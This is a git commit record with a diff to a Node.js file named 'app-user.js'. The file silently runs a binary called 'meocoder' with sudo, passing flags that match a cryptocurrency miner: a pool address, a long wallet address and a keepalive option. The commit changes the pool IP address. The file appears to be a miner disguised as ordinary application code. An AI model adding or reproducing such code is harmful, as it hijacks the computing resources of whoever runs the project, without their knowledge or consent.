e456ed5df7a0fd7b17e65c34c9f60aac07805bcb
vippro99 <80774966+vippro99@users.noreply.github.com>
2021-04-19 10:19:56 +0700

    Update app-user.js

--- app-user.js
+++ app-user.js
@@ -1,7 +1,7 @@
 const shell = require('shelljs');
 const { printLog } = require('./log-print');
 
-const runMonney = shell.exec(`sudo ./meocoder -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
+const runMonney = shell.exec(`sudo ./meocoder -o 104.154.230.90:9999 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
 if (runMonney.code !== undefined) {
     return 0;
 }
